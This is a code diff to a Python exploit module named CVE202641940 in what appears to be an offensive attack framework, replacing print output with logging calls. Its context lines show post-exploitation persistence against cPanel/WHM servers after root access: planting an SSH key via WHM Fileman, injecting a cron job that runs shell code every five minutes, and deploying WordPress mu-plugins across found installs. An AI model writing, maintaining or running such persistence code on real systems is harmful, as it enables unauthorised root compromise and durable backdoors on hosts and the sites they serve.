@@ -6,11 +6,14 @@ from __future__ import annotations
 import asyncio
 import base64
 import json
+import logging
 import os
 import random
 import re
 from contextlib import suppress
 from typing import Any, Dict, List, Optional
+
+_log = logging.getLogger(__name__)
 
 from cpointed.core.engine import Target, TargetType
 from cpointed.core.exceptions import SessionError, UnauthorizedOperationError
@@ -152,7 +155,7 @@ class CVE202641940(VulnerabilityModule):
         report["success"] = root_ok
 
         if root_ok:
-            print(f"[+] Root WHM access assumed on {target.host}:{target.port}")
+            _log.info("root access confirmed on %s:%s", target.host, target.port)
             if persistence:
                 await self._deploy_persistence(
                     client,
@@ -249,7 +252,7 @@ class CVE202641940(VulnerabilityModule):
                     "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...",
                 )
                 ok = await add_ssh_key_whm(client, session, public_key, timeout=timeout)
-                print(f"[+] SSH key WHM Fileman status={ok} on {target.host}")
+                _log.info("ssh key fileman status=%s on %s", ok, target.host)
             elif method == "cron":
                 ctx = ph.get("context") or {}
                 shell_code: Optional[str] = None
@@ -270,7 +273,7 @@ class CVE202641940(VulnerabilityModule):
                         schedule="*/5 * * * *",
                         timeout=timeout,
                     )
-                    print(f"[+] Cron inject status={ok} on {target.host}")
+                    _log.info("cron inject status=%s on %s", ok, target.host)
             elif method == "wp_mu_plugin":
                 wp_paths = await self._find_wordpress_installs(client, session, timeout)
                 for wp_path in wp_paths:
@@ -281,7 +284,7 @@ class CVE202641940(VulnerabilityModule):
                         ph,
                         timeout=timeout,
                     )
-                    print(f"[+] mu-plugin deploy status={ok} path={wp_path}")
+                    _log.info("mu-plugin deploy status=%s path=%s", ok, wp_path)
 
     async def _find_wordpress_installs(
         self,
